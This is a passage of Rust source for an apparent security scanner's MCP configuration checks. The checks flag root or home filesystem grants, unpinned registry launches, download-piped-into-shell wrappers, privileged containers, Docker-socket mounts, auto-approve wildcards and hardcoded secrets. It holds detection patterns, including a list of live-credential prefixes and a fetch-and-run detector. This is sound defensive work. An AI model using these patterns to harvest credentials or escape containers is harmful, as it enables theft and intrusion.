//! The individual `BAS-MCP-*` checks, run against the normalised
//! [`McpConfig`](super::model::McpConfig).

use std::collections::HashMap;
use std::path::Path;

use crate::category::Category;
use crate::finding::{Confidence, Finding, Kind, Location, Severity};
use crate::infra::DOCKER_SOCKET;

use super::launch::{launch_commands, pipes_download_into_shell, shell_script};
use super::model::{McpConfig, ServerEntry};

/// Run every check against every server in `config`, in a fixed order, so
/// that two runs over the same logical config — whatever format it was
/// written in — always produce findings in the same order.
pub(crate) fn run_all(config: &McpConfig, relative_path: &Path, contents: &str) -> Vec<Finding> {
    let mut servers: Vec<(&String, &ServerEntry)> = config.mcp_servers.iter().collect();
    servers.sort_by_key(|(name, _)| *name);

    let mut findings = check_global_auto_approve_wildcard(config, relative_path, contents);
    for (name, entry) in servers {
        findings.extend(check_broad_filesystem_access(
            name,
            entry,
            relative_path,
            contents,
        ));
        findings.extend(check_unpinned_server(name, entry, relative_path, contents));
        findings.extend(check_shell_wrapper(name, entry, relative_path, contents));
        findings.extend(check_docker_launch(name, entry, relative_path, contents));
        findings.extend(check_unauthenticated_http(
            name,
            entry,
            relative_path,
            contents,
        ));
        findings.extend(check_wildcard_tool_grant(
            name,
            entry,
            relative_path,
            contents,
        ));
        findings.extend(check_hardcoded_credentials(
            name,
            entry,
            relative_path,
            contents,
        ));
        findings.extend(check_secret_in_url(name, entry, relative_path, contents));
        findings.extend(check_auto_approve_wildcard(
            name,
            entry,
            relative_path,
            contents,
        ));
    }
    findings
}

/// Build the `BAS-MCP-000` finding for a config that failed to parse at all.
///
/// A broken MCP config is a real problem a developer wants surfaced, not a
/// scan error — this is what makes that possible without touching the
/// engine's error type.
pub(crate) fn malformed_finding(relative_path: &Path, contents: &str, reason: &str) -> Finding {
    let snippet = contents
        .lines()
        .next()
        .unwrap_or_default()
        .trim()
        .to_string();
    Finding {
        rule_id: "BAS-MCP-000".to_string(),
        title: "MCP configuration file is not valid".to_string(),
        kind: Kind::Defect,
        severity: Severity::Medium,
        confidence: Confidence::High,
        categories: vec![Category::Zt3],
        location: Location {
            file: relative_path.to_path_buf(),
            line: 1,
            column: 1,
        },
        snippet,
        description: format!(
            "This file matches a recognised MCP config name but does not parse: {reason}."
        ),
        remediation: "Fix the syntax error so the MCP configuration can be read and inspected."
            .to_string(),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    }
}

/// Find the first line containing `needle` and return its 1-indexed line
/// number and trimmed text. Falls back to the first line of the file when
/// `needle` is empty or not found — this is the documented "approximate"
/// case: the file's format-specific quoting can make an exact match miss,
/// and an approximate location beats no location.
pub(crate) fn locate(contents: &str, needle: &str) -> (usize, String) {
    if !needle.is_empty() {
        for (index, line) in contents.lines().enumerate() {
            if line.contains(needle) {
                return (index + 1, line.trim().to_string());
            }
        }
    }
    let first = contents.lines().next().unwrap_or_default();
    (1, first.trim().to_string())
}

/// The byte offset where server `name`'s entry starts: its JSON key
/// (`"name":`), its YAML key (`name:`) or its TOML table header
/// (`[mcp_servers.name]`). `None` when the file does not spell it that way.
fn entry_start(contents: &str, name: &str) -> Option<usize> {
    let quoted = format!("\"{name}\"");
    let mut offset = 0;
    for line in contents.split_inclusive('\n') {
        let trimmed = line.trim_start();
        let indent = line.len() - trimmed.len();
        let key_follows =
            |rest: &str| rest.trim_start().starts_with(':') || rest.trim_start().starts_with('=');
        let found = if let Some(at) = line.find(&quoted) {
            key_follows(&line[at + quoted.len()..]).then_some(at)
        } else if let Some(rest) = trimmed.strip_prefix(name) {
            rest.trim_start().starts_with(':').then_some(indent)
        } else if trimmed.starts_with('[') {
            let header = trimmed
                .trim_end()
                .trim_start_matches('[')
                .trim_end_matches(']');
            let last = header.rsplit('.').next().unwrap_or_default();
            (last.trim().trim_matches('"') == name).then_some(indent)
        } else {
            None
        };
        if let Some(at) = found {
            return Some(offset + at);
        }
        offset += line.len();
    }
    None
}

/// Where server `name`'s entry starts: (1-based line, 1-based column counted in
/// characters, trimmed text of that line). Falls back to [`locate`]'s line and
/// column 1 when the file does not spell the entry as a key or table header.
pub(crate) fn locate_entry(contents: &str, name: &str) -> (usize, usize, String) {
    if let Some(start) = entry_start(contents, name) {
        let before = &contents[..start];
        let line_start = before.rfind('\n').map_or(0, |at| at + 1);
        let line = before.matches('\n').count() + 1;
        let column = contents[line_start..start].chars().count() + 1;
        let text = contents[line_start..].lines().next().unwrap_or_default();
        return (line, column, text.trim().to_string());
    }
    let (line, snippet) = locate(contents, name);
    (line, 1, snippet)
}

/// Like [`locate`], but looks only from where server `name`'s entry starts,
/// so two servers with the same text each get their own line. The first of
/// `needles` that occurs from there on is used; when none does, or the entry
/// cannot be found, the search covers the whole file.
fn locate_in_entry(contents: &str, name: &str, needles: &[&str]) -> (usize, String) {
    if let Some(start) = entry_start(contents, name) {
        let first_line = contents[..start].matches('\n').count();
        for needle in needles.iter().filter(|needle| !needle.is_empty()) {
            for (index, line) in contents.lines().enumerate().skip(first_line) {
                if line.contains(needle) {
                    return (index + 1, line.trim().to_string());
                }
            }
        }
    }
    locate(contents, needles.first().copied().unwrap_or_default())
}

/// The line of server `name`'s bind mount from `source`: the `-v`/`--volume`
/// form (`source:`), then the `--mount` forms (`src=`, `source=`).
fn locate_mount(contents: &str, name: &str, source: &str) -> (usize, String) {
    let volume = format!("{source}:");
    let src = format!("src={source}");
    let long_src = format!("source={source}");
    locate_in_entry(contents, name, &[&volume, &src, &long_src, source])
}

fn location(relative_path: &Path, line: usize) -> Location {
    Location {
        file: relative_path.to_path_buf(),
        line,
        column: 1,
    }
}

/// `BAS-MCP-001` — an MCP server granted root or broad filesystem access.
fn check_broad_filesystem_access(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Option<Finding> {
    let offending_arg = entry
        .args
        .iter()
        .find(|arg| is_broad_filesystem_path(arg))?;
    let (line, snippet) = locate(contents, offending_arg);

    Some(Finding {
        rule_id: "BAS-MCP-001".to_string(),
        title: "MCP server granted root or broad filesystem access".to_string(),
        kind: Kind::Defect,
        severity: Severity::High,
        confidence: Confidence::High,
        categories: vec![Category::Zt3],
        location: location(relative_path, line),
        snippet,
        description: format!(
            "Server `{name}` is launched with `{offending_arg}` in `args`, granting it access \
             to the filesystem root or an entire home directory rather than a scoped path."
        ),
        remediation: "Scope the argument to the narrowest directory the server actually needs \
             (e.g. `/srv/app/data`), not `/`, `~`, or a home directory."
            .to_string(),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    })
}

/// True for an argument that grants filesystem access broader than a single
/// project directory: the root, a bare reference to the home directory, or
/// the home directory's own path (as opposed to something scoped inside it).
///
/// Deliberately narrow: `/srv/app/data` and `/home/alice/data` are scoped
/// enough not to worry about, even though the latter lives under a home
/// directory — only the home directory *itself* is broad.
fn is_broad_filesystem_path(arg: &str) -> bool {
    let trimmed = arg.trim();
    if trimmed == "/" || trimmed == "~" || trimmed == "~/" {
        return true;
    }
    if trimmed.contains("$HOME") {
        return true;
    }
    is_home_directory_root(trimmed)
}

/// True for a path that names a user's home directory itself
/// (`/home/alice`, `/Users/alice`), not something inside it.
fn is_home_directory_root(path: &str) -> bool {
    let path = path.strip_suffix('/').unwrap_or(path);
    let segments: Vec<&str> = path.split('/').collect();
    // Exactly ["", "home"|"Users", "<user>"] — three segments, empty first
    // (the leading slash), a known parent, and a non-empty user segment.
    if let [first, parent, user] = segments.as_slice() {
        first.is_empty() && (*parent == "home" || *parent == "Users") && !user.is_empty()
    } else {
        false
    }
}

/// What a `docker run` / `podman run` command line asks for.
#[derive(Default)]
struct DockerOptions {
    privileged: bool,
    host_network: bool,
    /// Host-side source of every bind mount.
    mount_sources: Vec<String>,
}

/// Read the isolation-relevant options from the arguments after `run`.
///
/// Every argument after `run` is examined, including ones after the image
/// name. An argument such as `--privileged` that belongs to the container's
/// own command line would be misread, which is accepted: it is rare, and the
/// opposite choice (guessing where the image name ends from a hand-kept list
/// of value-taking flags) would silently miss real flags.
fn docker_options(args: &[String]) -> DockerOptions {
    let mut options = DockerOptions::default();
    let mut index = 0;
    while index < args.len() {
        let arg = args[index].as_str();
        let next = args.get(index + 1).map(String::as_str);
        match arg {
            "--privileged" | "--privileged=true" => options.privileged = true,
            "--network" | "--net" if next == Some("host") => options.host_network = true,
            "--network=host" | "--net=host" => options.host_network = true,
            "-v" | "--volume" => {
                if let Some(volume) = next {
                    options.mount_sources.push(volume_source(volume));
                }
            }
            "--mount" => {
                if let Some(spec) = next {
                    options.mount_sources.extend(mount_source(spec));
                }
            }
            _ => {
                if let Some(volume) = arg.strip_prefix("--volume=") {
                    options.mount_sources.push(volume_source(volume));
                } else if let Some(spec) = arg.strip_prefix("--mount=") {
                    options.mount_sources.extend(mount_source(spec));
                }
            }
        }
        index += 1;
    }
    options
}

/// The host-side part of a `-v source:target[:mode]` value.
fn volume_source(volume: &str) -> String {
    volume.split(':').next().unwrap_or_default().to_owned()
}

/// The `src=` / `source=` value of a `--mount` spec.
fn mount_source(spec: &str) -> Option<String> {
    spec.split(',').find_map(|part| {
        let (key, value) = part.split_once('=')?;
        matches!(key.trim(), "src" | "source").then(|| value.trim().to_owned())
    })
}

/// `BAS-MCP-001` (bind mounts), `BAS-MCP-007` and `BAS-MCP-008`: what a
/// container launcher asks of the host.
///
/// A root or home bind mount is the container form of the broad filesystem
/// grant `BAS-MCP-001` already reports. `--privileged` and the Docker socket
/// are the same evidence the Compose checks `BAS-INFRA-003`/`-004` use.
/// Host networking is an observation, as `BAS-INFRA-005` is: it is how many
/// legitimate sidecars run, and the repository cannot show it is wrong here.
fn check_docker_launch(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for command in launch_commands(entry) {
        if !matches!(command.program.as_str(), "docker" | "podman" | "nerdctl") {
            continue;
        }
        let Some(run_at) = command.args.iter().position(|arg| arg == "run") else {
            continue;
        };
        let options = docker_options(&command.args[run_at + 1..]);

        if let Some(source) = options
            .mount_sources
            .iter()
            .find(|source| is_broad_filesystem_path(source))
        {
            let (line, snippet) = locate_mount(contents, name, source);
            findings.push(Finding {
                rule_id: "BAS-MCP-001".to_string(),
                title: "MCP server granted root or broad filesystem access".to_string(),
                kind: Kind::Defect,
                severity: Severity::High,
                confidence: Confidence::High,
                categories: vec![Category::Zt3],
                location: location(relative_path, line),
                snippet,
                description: format!(
                    "Server `{name}` runs a container with `{source}` bind-mounted from the host, \
                     granting it the filesystem root or an entire home directory rather than a \
                     scoped path."
                ),
                remediation: "Mount only the narrowest directory the server needs, read-only \
                     where possible."
                    .to_string(),
                secondary_rule_ids: Vec::new(),
                references: Vec::new(),
            });
        }

        let socket = options
            .mount_sources
            .iter()
            .any(|source| source == DOCKER_SOCKET || source == "/run/docker.sock");
        if options.privileged || socket {
            let (needle, what) = if options.privileged {
                (
                    "--privileged",
                    "`--privileged`, which removes the container's capability, seccomp and \
                     device restrictions",
                )
            } else {
                (
                    "docker.sock",
                    "the Docker socket, which is full control of the Docker daemon",
                )
            };
            let (line, snippet) = locate_in_entry(contents, name, &[needle]);
            findings.push(Finding {
                rule_id: "BAS-MCP-007".to_string(),
                title: "MCP server container escapes its isolation".to_string(),
                kind: Kind::Defect,
                severity: Severity::High,
                confidence: Confidence::High,
                categories: vec![Category::Zt3],
                location: location(relative_path, line),
                snippet,
                description: format!(
                    "Server `{name}` is launched with {what}. Anything the server runs, including \
                     a tool an agent chooses to call, can reach the host."
                ),
                remediation: "Drop the option. Grant a specific capability or device instead, or \
                     put a scoped proxy in front of the daemon."
                    .to_string(),
                secondary_rule_ids: Vec::new(),
                references: Vec::new(),
            });
        }

        if options.host_network {
            let (line, snippet) = locate_in_entry(contents, name, &["--net"]);
            findings.push(Finding {
                rule_id: "BAS-MCP-008".to_string(),
                title: "MCP server container shares the host network".to_string(),
                kind: Kind::Observation,
                severity: Severity::Medium,
                confidence: Confidence::High,
                categories: vec![Category::Zt3],
                location: location(relative_path, line),
                snippet,
                description: format!(
                    "Server `{name}` runs a container on the host network namespace, so it can \
                     reach services bound to the host's loopback interface."
                ),
                remediation: "Use a bridge network and publish only the ports the server needs, \
                     unless host networking is required."
                    .to_string(),
                secondary_rule_ids: Vec::new(),
                references: Vec::new(),
            });
        }
    }
    findings
}

/// `BAS-MCP-002` — an MCP server reached over unauthenticated plaintext
/// HTTP.
///
/// `localhost`/`127.0.0.1` over `http://` is normal local development, not a
/// defect — nothing crosses the network. It is still reported, but as a
/// low-severity observation, so a config that is fine on a laptop but gets
/// copied verbatim to a shared or public host is not invisible.
fn check_unauthenticated_http(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Option<Finding> {
    let url = entry.url.as_deref()?;
    if !url.to_ascii_lowercase().starts_with("http://") {
        return None;
    }
    // Only `headers` can authenticate an HTTP request. `env` is the environment
    // handed to a spawned process, which is how a stdio server is configured —
    // it is never sent over the wire, so it cannot authenticate a transport.
    //
    // This check used to consult `env` as well, which meant a hardcoded
    // credential there was read as proof of authentication and suppressed this
    // finding entirely. A server vulnerable on two independent axes reported
    // one, and the more serious problem was the one doing the hiding.
    if has_auth_looking_key(&entry.headers) {
        return None;
    }

    let (line, snippet) = locate(contents, url);
    let loc = location(relative_path, line);

    if is_localhost(url) {
        return Some(Finding {
            rule_id: "BAS-MCP-002".to_string(),
            title: "MCP server reached over unauthenticated local HTTP".to_string(),
            kind: Kind::Observation,
            severity: Severity::Low,
            confidence: Confidence::Medium,
            categories: vec![Category::Zt1],
            location: loc,
            snippet,
            description: format!(
                "Server `{name}` uses `http://` with no authentication, but the host is \
                 `localhost`. Normal for local development; nothing here leaves the machine."
            ),
            remediation: "No action needed for local use. Add authentication and switch to \
                 `https://` before pointing this config at a shared or remote host."
                .to_string(),
            secondary_rule_ids: Vec::new(),
            references: Vec::new(),
        });
    }

    Some(Finding {
        rule_id: "BAS-MCP-002".to_string(),
        title: "MCP server reached over unauthenticated plaintext HTTP".to_string(),
        kind: Kind::Defect,
        severity: Severity::High,
        confidence: Confidence::Medium,
        categories: vec![Category::Zt1],
        location: loc,
        snippet,
        description: format!(
            "Server `{name}` is reached at `{url}` with no `Authorization`, token, or key in \
             its headers or environment. Traffic and any embedded credentials are exposed to \
             anyone on the network path."
        ),
        remediation: "Switch to `https://` and add an authentication header, or move the \
             server behind a VPN or mTLS boundary."
            .to_string(),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    })
}

/// `BAS-MCP-005` — an MCP server launched from a package registry with no
/// version pin.
///
/// `npx -y @scope/server-x` resolves to whatever the registry serves at the
/// moment it runs, so the code executing inside your agent's trust boundary can
/// change between two runs with no change to your repository. An MCP server
/// holds whatever scope the manifest grants it, which makes it a more valuable
/// supply-chain target than an ordinary library.
///
/// This is the only part of MCP supply chain the manifest can settle. Bastyn
/// does not read the server's own source, and an `npx`-launched package appears
/// in no dependency manifest, so `BAS-CVE-001` never sees it either.
fn check_unpinned_server(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Vec<Finding> {
    /// Launchers that resolve a package from a registry at run time.
    const RESOLVING_LAUNCHERS: [&str; 4] = ["npx", "uvx", "pnpx", "bunx"];

    let Some(command) = entry.command.as_deref() else {
        return Vec::new();
    };
    let launcher = command
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(command)
        .to_ascii_lowercase();
    if !RESOLVING_LAUNCHERS.contains(&launcher.as_str()) {
        return Vec::new();
    }

    // The package specifier is the first argument that is not a flag. `-y` and
    // friends carry no version information.
    let Some(package) = entry
        .args
        .iter()
        .find(|arg| !arg.starts_with('-'))
        .map(String::as_str)
    else {
        return Vec::new();
    };

    if is_version_pinned(package) {
        return Vec::new();
    }

    let (line, snippet) = locate(contents, package);
    vec![Finding {
        rule_id: "BAS-MCP-005".to_string(),
        title: format!("MCP server '{name}' is launched without a version pin"),
        kind: Kind::Defect,
        severity: Severity::High,
        confidence: Confidence::High,
        categories: vec![Category::Llm04],
        location: location(relative_path, line),
        snippet,
        description: format!(
            "`{package}` resolves to whatever the registry serves when the agent starts, so the \
             code running inside its trust boundary can change with no change to this repository."
        ),
        remediation: format!(
            "Pin the version, e.g. `{package}@1.2.3`, and raise it deliberately. An MCP server \
             runs with the scope this manifest grants it, so an unreviewed update is an \
             unreviewed privilege change."
        ),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    }]
}

/// `BAS-MCP-006` - a shell wrapper that downloads code and runs it, plus the
/// root-path and version-pin checks applied to a registry launcher inside
/// the wrapper.
///
/// A wrapper on its own reports nothing: `sh -c "exec node server.js"` is the
/// repository owner's own launcher. What is reported is what the script does
/// that the manifest checks would otherwise miss: code fetched at launch with
/// no pin, and `npx -y pkg /` hidden behind `sh -c`.
fn check_shell_wrapper(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Vec<Finding> {
    let Some(script) = shell_script(entry) else {
        return Vec::new();
    };
    let mut findings = Vec::new();

    if pipes_download_into_shell(&script) {
        let (line, snippet) = locate(contents, &script);
        findings.push(Finding {
            rule_id: "BAS-MCP-006".to_string(),
            title: "MCP server launcher downloads and runs code".to_string(),
            kind: Kind::Defect,
            severity: Severity::High,
            confidence: Confidence::High,
            categories: vec![Category::Llm04],
            location: location(relative_path, line),
            snippet,
            description: format!(
                "Server `{name}` is launched through a shell script that downloads content and \
                 pipes it into a shell. What runs is whatever the remote address serves when the \
                 agent starts, with no pin and no change to this repository."
            ),
            remediation: "Install a pinned, checksummed release ahead of time and launch it \
                 directly, instead of fetching and running code at startup."
                .to_string(),
            secondary_rule_ids: Vec::new(),
            references: Vec::new(),
        });
    }

    for inner in launch_commands(entry).into_iter().skip(1) {
        if !matches!(inner.program.as_str(), "npx" | "uvx" | "pnpx" | "bunx") {
            continue;
        }
        let synthetic = ServerEntry {
            command: Some(inner.program),
            args: inner.args,
            ..ServerEntry::default()
        };
        findings.extend(check_broad_filesystem_access(
            name,
            &synthetic,
            relative_path,
            contents,
        ));
        findings.extend(check_unpinned_server(
            name,
            &synthetic,
            relative_path,
            contents,
        ));
    }
    findings
}

/// True if `package` carries an explicit version.
///
/// Handles the scoped form, where the leading `@` is part of the name rather
/// than a version separator: `@scope/name@1.2.3` is pinned, `@scope/name` is
/// not.
fn is_version_pinned(package: &str) -> bool {
    let after_scope = package.strip_prefix('@').unwrap_or(package);
    after_scope.contains('@')
}

/// True if the map has at least one key that reads like it carries an
/// authentication credential.
fn has_auth_looking_key(map: &HashMap<String, serde_json::Value>) -> bool {
    const MARKERS: [&str; 5] = ["auth", "token", "bearer", "key", "secret"];
    map.keys().any(|key| {
        let lower = key.to_ascii_lowercase();
        MARKERS.iter().any(|marker| lower.contains(marker))
    })
}

/// True if `url`'s host is `localhost`, `127.0.0.1`, or `::1`.
fn is_localhost(url: &str) -> bool {
    let without_scheme = url
        .strip_prefix("http://")
        .or_else(|| url.strip_prefix("https://"))
        .unwrap_or(url);
    let host = without_scheme.split(['/', ':']).next().unwrap_or("");
    host.eq_ignore_ascii_case("localhost") || host == "127.0.0.1" || host == "::1"
}

/// `BAS-MCP-003` — a wildcard tool grant.
fn check_wildcard_tool_grant(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Option<Finding> {
    let fields: [(&str, Option<&serde_json::Value>); 3] = [
        ("tools", entry.tools.as_ref()),
        ("permissions", entry.permissions.as_ref()),
        ("allowedTools", entry.allowed_tools.as_ref()),
    ];
    let (field_name, _) = fields
        .into_iter()
        .find(|(_, value)| value.is_some_and(grants_wildcard))?;

    let (line, snippet) = locate(contents, "*");

    Some(Finding {
        rule_id: "BAS-MCP-003".to_string(),
        title: "MCP server granted a wildcard tool grant".to_string(),
        kind: Kind::Defect,
        severity: Severity::High,
        confidence: Confidence::High,
        categories: vec![Category::Zt2],
        location: location(relative_path, line),
        snippet,
        description: format!(
            "Server `{name}`'s `{field_name}` grants every tool with `\"*\"` instead of an \
             explicit list, so any tool the server adds later is trusted automatically."
        ),
        remediation: "Replace the wildcard with the specific tool names this server is \
             expected to use."
            .to_string(),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    })
}

/// True if `value` is the bare string `"*"`, or an array containing it.
fn grants_wildcard(value: &serde_json::Value) -> bool {
    match value {
        serde_json::Value::String(text) => text == "*",
        serde_json::Value::Array(items) => items.iter().any(|item| item.as_str() == Some("*")),
        _ => false,
    }
}

/// `BAS-LLM03-020` — a client-wide `autoApprove`/`alwaysAllow` wildcard,
/// applying to every server this config declares.
///
/// This is the catalogue's own example shape: `{"autoApprove": true,
/// "alwaysAllow": ["*"]}` written at the top of the file rather than under
/// one server. Reported once per config, not once per server — there is
/// exactly one client-wide setting to report, no matter how many servers it
/// covers.
fn check_global_auto_approve_wildcard(
    config: &McpConfig,
    relative_path: &Path,
    contents: &str,
) -> Vec<Finding> {
    let fields: [(&str, Option<&serde_json::Value>); 2] = [
        ("autoApprove", config.auto_approve.as_ref()),
        ("alwaysAllow", config.always_allow.as_ref()),
    ];
    let Some((field_name, _)) = fields
        .into_iter()
        .find(|(_, value)| value.is_some_and(is_auto_approve_wildcard))
    else {
        return Vec::new();
    };

    let (line, snippet) = locate(contents, field_name);
    vec![Finding {
        rule_id: "BAS-LLM03-020".to_string(),
        title: "MCP client config auto-approves every tool call".to_string(),
        kind: Kind::Observation,
        severity: Severity::Medium,
        confidence: Confidence::High,
        categories: vec![Category::Llm03],
        location: location(relative_path, line),
        snippet,
        description: format!(
            "This config's `{field_name}` is set to trust every tool call from every server it \
             declares with no human confirmation, removing the approval prompt that limits what \
             a compromised or rug-pulled server can do without anyone noticing."
        ),
        remediation: "Replace the wildcard with an explicit list of the specific tools that are \
             safe to auto-approve, and leave everything else to prompt."
            .to_string(),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    }]
}

/// `BAS-LLM03-020` — a per-server `autoApprove`/`alwaysAllow` wildcard.
///
/// Same idea as [`check_global_auto_approve_wildcard`], scoped to one server:
/// `{"mcpServers": {"fs": {"autoApprove": true}}}` or `["*"]` skips the
/// human-in-the-loop confirmation for every tool that server exposes, present
/// or future. A named allowlist (`["read_file", "list_directory"]`) is the
/// correct, narrower use of the same field and is not this finding.
fn check_auto_approve_wildcard(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Option<Finding> {
    let fields: [(&str, Option<&serde_json::Value>); 2] = [
        ("autoApprove", entry.auto_approve.as_ref()),
        ("alwaysAllow", entry.always_allow.as_ref()),
    ];
    let (field_name, _) = fields
        .into_iter()
        .find(|(_, value)| value.is_some_and(is_auto_approve_wildcard))?;

    let (line, snippet) = locate(contents, field_name);

    Some(Finding {
        rule_id: "BAS-LLM03-020".to_string(),
        title: "MCP server auto-approves every tool call".to_string(),
        kind: Kind::Observation,
        severity: Severity::Medium,
        confidence: Confidence::High,
        categories: vec![Category::Llm03],
        location: location(relative_path, line),
        snippet,
        description: format!(
            "Server `{name}`'s `{field_name}` is set to trust every tool call with no human \
             confirmation, removing the approval prompt that limits what a compromised or \
             rug-pulled server can do without anyone noticing."
        ),
        remediation: "Replace the wildcard with an explicit list of the specific tools that are \
             safe to auto-approve, and leave everything else to prompt."
            .to_string(),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    })
}

/// True if `value` grants blanket trust: the boolean `true`, or an array
/// containing `"*"`. An empty array, `false`, or a list of specific tool
/// names is the safe, narrower use of the same field and is not a wildcard.
fn is_auto_approve_wildcard(value: &serde_json::Value) -> bool {
    match value {
        serde_json::Value::Bool(approved) => *approved,
        serde_json::Value::Array(items) => items.iter().any(|item| item.as_str() == Some("*")),
        _ => false,
    }
}

/// `BAS-MCP-004` — a hardcoded credential in an MCP server's `env` block.
fn check_hardcoded_credentials(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut env_vars: Vec<(&String, &serde_json::Value)> = entry.env.iter().collect();
    env_vars.sort_by_key(|(key, _)| *key);

    env_vars
        .into_iter()
        .filter_map(|(key, value)| {
            let value = value.as_str()?;
            if !is_plausible_secret(key, value) {
                return None;
            }
            let (line, snippet) = locate(contents, value);
            Some(Finding {
                rule_id: "BAS-MCP-004".to_string(),
                title: "Hardcoded credential in MCP server environment".to_string(),
                kind: Kind::Defect,
                severity: Severity::Critical,
                confidence: Confidence::High,
                categories: vec![Category::Zt1],
                location: location(relative_path, line),
                snippet,
                description: format!(
                    "Server `{name}`'s `env.{key}` holds what looks like a live credential, \
                     committed to the config instead of injected at runtime."
                ),
                remediation: format!(
                    "Move the value out of the config and reference the environment \
                     instead, as `${{{key}}}`, then rotate the exposed credential."
                ),
                secondary_rule_ids: Vec::new(),
                references: Vec::new(),
            })
        })
        .collect()
}

/// `BAS-MCP-009` — a literal credential in the query string of a server URL.
///
/// The URL is committed to the repository and sent with every request, and
/// URLs are routinely written to access logs, so a key placed there is
/// exposed twice over. Reported only when the parameter's name suggests a
/// secret AND its value has the shape of one, the same two-part evidence
/// `BAS-MCP-004` requires; a `${VAR}` placeholder reports nothing.
fn check_secret_in_url(
    name: &str,
    entry: &ServerEntry,
    relative_path: &Path,
    contents: &str,
) -> Option<Finding> {
    let url = entry.url.as_deref()?;
    let query = url.split_once('?')?.1;
    let query = query.split('#').next().unwrap_or(query);
    let (key, value) = query
        .split('&')
        .filter_map(|pair| pair.split_once('='))
        .find(|(key, value)| is_plausible_secret(key, value))?;
    let (line, snippet) = locate(contents, value);
    let transport = entry
        .transport()
        .map_or("remote", super::model::Transport::label);

    Some(Finding {
        rule_id: "BAS-MCP-009".to_string(),
        title: "Credential in MCP server URL".to_string(),
        kind: Kind::Defect,
        severity: Severity::High,
        confidence: Confidence::High,
        categories: vec![Category::Zt1],
        location: location(relative_path, line),
        snippet,
        description: format!(
            "Server `{name}` ({transport}) has what looks like a live credential in the \
             `{key}` query parameter of its `url`. It is committed to the repository and \
             travels in every request line, where proxies and access logs record it."
        ),
        remediation: "Send the credential in an `Authorization` header read from the \
             environment instead, and rotate the exposed value."
            .to_string(),
        secondary_rule_ids: Vec::new(),
        references: Vec::new(),
    })
}

/// True if `key` names something that suggests a secret AND `value` has the
/// shape of a real one — both are required. This is the conservative
/// combination that keeps a variable like `approx_tokens` (a plausible key
/// substring match on "token" alone, with an ordinary numeric-looking value)
/// from being flagged: its key does not tokenize to the word `token` (it
/// tokenizes to `tokens`, plural), and even if it did, its value would not
/// pass the secret-shape check.
fn is_plausible_secret(key: &str, value: &str) -> bool {
    key_suggests_secret(key) && !is_placeholder(value) && looks_like_secret_value(value)
}

/// Secret-sounding whole words a key might tokenize into. Deliberately
/// exact-word matching (via [`key_words`]), not substring matching, so
/// `authorized_users` does not match `auth`.
///
/// Plurals are included: a real credential under `API_KEYS` must not be missed.
/// That is safe because a key name alone never reports a finding — the value
/// must also look like a secret, which is what keeps `approx_tokens: 1500`
/// quiet.
const SECRET_KEY_WORDS: [&str; 13] = [
    "key",
    "keys",
    "token",
    "tokens",
    "secret",
    "secrets",
    "password",
    "passwords",
    "passwd",
    "pwd",
    "credential",
    "credentials",
    "apikey",
];

fn key_suggests_secret(key: &str) -> bool {
    key_words(key)
        .iter()
        .any(|word| SECRET_KEY_WORDS.contains(&word.as_str()))
}

/// Split an identifier into lowercase words on `_`, `-`, spaces, and
/// camelCase boundaries, e.g. `API_TOKEN` -> `["api", "token"]`,
/// `apiKey` -> `["api", "key"]`, `approx_tokens` -> `["approx", "tokens"]`.
fn key_words(key: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut prev_was_lower = false;
    for ch in key.chars() {
        if ch == '_' || ch == '-' || ch == ' ' {
            if !current.is_empty() {
                words.push(std::mem::take(&mut current).to_ascii_lowercase());
            }
            prev_was_lower = false;
            continue;
        }
        if ch.is_uppercase() && prev_was_lower && !current.is_empty() {
            words.push(std::mem::take(&mut current).to_ascii_lowercase());
        }
        prev_was_lower = ch.is_lowercase();
        current.push(ch);
    }
    if !current.is_empty() {
        words.push(current.to_ascii_lowercase());
    }
    words
}

/// True for values that are conventionally placeholders rather than real
/// secrets: `${VAR}`, `$VAR`, `<your-key>`, `changeme`, `xxx`, `TODO`,
/// `example`, or empty.
fn is_placeholder(value: &str) -> bool {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return true;
    }
    if trimmed.starts_with("${") && trimmed.ends_with('}') {
        return true;
    }
    if let Some(rest) = trimmed.strip_prefix('$')
        && !rest.is_empty()
        && rest.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    {
        return true;
    }
    if trimmed.starts_with('<') && trimmed.ends_with('>') {
        return true;
    }
    let lower = trimmed.to_ascii_lowercase();
    lower == "changeme"
        || lower == "xxx"
        || lower == "todo"
        || lower == "example"
        || lower.chars().all(|c| c == 'x')
}

/// Known live-credential prefixes. Any of these is sufficient on its own —
/// the vendor-specific prefix is already a strong signal.
const SECRET_PREFIXES: [&str; 8] = [
    "sk-",
    "sk_live_",
    "ghp_",
    "gho_",
    "github_pat_",
    "AKIA",
    "xox",
    "AIza",
];

/// True if `value` has the shape of a real secret: a known vendor prefix, or
/// a long run of letters-and-digits that reads as generated rather than
/// human-chosen.
fn looks_like_secret_value(value: &str) -> bool {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return false;
    }
    if SECRET_PREFIXES
        .iter()
        .any(|prefix| trimmed.starts_with(prefix))
    {
        return true;
    }
    has_high_entropy_run(trimmed)
}

/// True if `value` contains an unbroken run of 24+ alphanumeric characters
/// that mixes letters and digits — the shape of a generated token, as
/// opposed to a short human-chosen word.
fn has_high_entropy_run(value: &str) -> bool {
    let mut run = String::new();
    let mut found = false;
    for ch in value.chars() {
